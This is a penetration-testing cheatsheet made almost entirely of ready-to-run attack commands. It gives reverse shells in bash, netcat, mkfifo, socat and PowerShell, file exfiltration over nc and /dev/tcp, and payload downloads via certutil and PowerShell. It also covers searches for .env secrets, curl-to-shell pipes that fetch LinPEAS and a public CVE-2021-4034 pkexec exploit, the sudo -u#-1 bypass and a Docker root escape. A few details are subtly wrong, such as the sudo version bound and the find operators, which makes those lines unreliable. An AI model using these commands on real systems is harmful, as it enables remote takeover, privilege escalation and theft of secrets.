# CHEATSHEET  
  
 
## NETWORK ENUMERATION
  
 ### HOST DISCOVERY
```bash
arp-scan -I <INTERFACE> --localnet --ignoredups
```
  
 ### TCP OPEN PORTS
```bash
nmap -p- --open -sS -n -v -Pn --min-rate 5000 -oG allPorts <TARGET> 
```
  
 ### INFO & VERSION
```bash
nmap -p<PORTS> -sCV -oN portScan <TARGET>
```
  
 ### HTTP ENUMERATION
 Enumerate common directories and files with nmap
```bash
nmap -p<PORTS> --script http-enum -oN webScan <TARGET>
```

 Gobuster
```bash
# Directories
gobuster dir -u <URL> -w <WORDLIST>

# Files by extension
gobuster dir -u <URL> -w <WORDLIST> -x http,php,txt

# Subdomains
gobuster vhost -u <URL> -w <WORDLIST>

# Useful parameters
--threads, -t
--exclude-length
--status-codes, -s
--status-codes-blacklist, -b
--no-tls-validation, -k
--timeout
```
  
  
  
## REVERSE SHELLS
  
 ### BASH
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```
  
 ### NETCAT
```bash
nc -e /bin/bash <IP> <PORT>
```
  
 ### MKFIFO
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```
  
 ### SOCAT
```bash
socat tcp-connect:<IP>:<PORT> exec:/bin/bash,pty,stderr,setsid,sigint,sane
```
  
 ### POWERSHELL
```powershell
$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
  
 ### INTERACTIVE TTY
```bash
script /dev/null -c bash
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
# Check size in another window: stty size
stty rows <ROWS> columns <COLUMNS>
```
  
  
  
## SHARE AND DOWNLOAD
  
 ### HTTP SERVER
```bash
# Python3
python3 -m http.server <PORT>

# Python2
python -m SimpleHTTPServer <PORT>

# PHP
php -S 0.0.0.0:<PORT>
```
  
 ### SMB 
```bash
smbserver.py <NAME> $(pwd) -smb2support
```
  
 ### FILE TRANSFER ( NETCAT - BASH ) 
```bash
# Listen
nc -nlvp <PORT> > <FILE>

# Send
cat <FILE> | nc <IP> <PORT>  # Netcat
cat <FILE> > /dev/tcp/<IP>/<PORT>  # Bash
```
  
 ### DOWNLOAD 
 #### Powershell
```powershell
(New-Object Net.WebClient).DownloadString('<URL>') > <PATH>
```

####Cmd
```shell
certutil -urlcache -split -f <URL> <PATH>
```

#### Bash
```bash
wget "http://<IP>/"
```
  
  
  
## SYSTEM ENUMERATION
  
 ### Enviroment Variables
```bash
# User enviroment variables
env || set

# Common project enviroment file
find / -name ".env" 2>/dev/null
```
  
 ### Find SUID on GUID files
```bash
# SUID
find / -perm -4000 2>/dev/null

# GUID
find / -perm -2000 2>/dev/null
```
  
 ### Check capabilities
```bash
getcap -r / 2>/dev/null
```
  
 ### Open local ports
```bash
ss -nltp
```
  
 ### Cron Jobs
```bash
# Cron files
find /etc -name "cron*" 2>/dev/null

# Logs
ls -l /var/log/syslog
ls -l /var/log/cron
```
  
 ### Monitoring processes
```bash
old_ps=$(ps -eo user,command); while true; do; new_ps=$(ps -eo user,command); diff <(echo "$old_ps") <(echo "$new_ps") | grep "[\>\<]" |grep -Ev "kworker|user,command"; old_ps=$new_ps; done
```
  
 ### Scripts with write permissions
```bash
find / -user <USER> -perm -o+w \( -name \"*.sh\" -O -name \"*.py\" -O -name \"*.pl\" -O -name \"*.rb\" -O -name \"*.go\" -O -name \"*.lua\" \) 2>/dev/null
```
  
 ### LinPEAS
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
  
  
  
## PRIVILEGE ESCALATION
  
 ### Sudo
```bash
# List user privileges
sudo -l

# Check sudo version
sudo -V | grep "Sudo ver"

# Sudo < v1.28
sudo -u#-1 /bin/bash
```
  
 ### Polkit - (CVE-2021-4034)
```bash
# Check pkexec permissions
ls -l $(which pkexec)

# If pkexec has SUID
curl -L https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py | python3
```
  
 ### Docker
```bash
docker run -it --rm -v /:/mnt alpine chroot /mnt sh
```

